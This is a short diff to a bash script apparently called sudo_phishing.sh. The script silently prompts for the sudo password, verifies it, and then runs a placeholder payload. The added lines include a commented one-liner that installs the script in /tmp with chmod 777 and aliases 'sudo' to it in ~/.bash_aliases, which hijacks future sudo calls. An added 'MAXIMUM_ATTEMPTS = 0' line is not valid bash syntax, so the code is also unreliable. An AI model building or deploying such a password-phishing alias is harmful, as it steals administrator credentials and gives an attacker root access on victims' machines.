@@ -18,6 +18,7 @@ attempts() {
     read -r -s sudo_password
     echo ""
     if ( echo "${sudo_password}" | sudo -k -S true > /dev/null 2>&1 ); then
+        MAXIMUM_ATTEMPTS = 0
         ##
         # <YOUR-PAYLOAD>
         ##
@@ -42,3 +43,5 @@ for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
     attempts "${@}"
 done
 /bin/echo "${ERROR_MESSAGE}"
+
+#rm /tmp/sudo_phishing.sh && cp sudo_phishing.sh /tmp/sudo_phishing.sh && chmod 777 /tmp/sudo_phishing.sh && alias sudo='/tmp/sudo_phishing.sh' >> ~/.bash_aliases
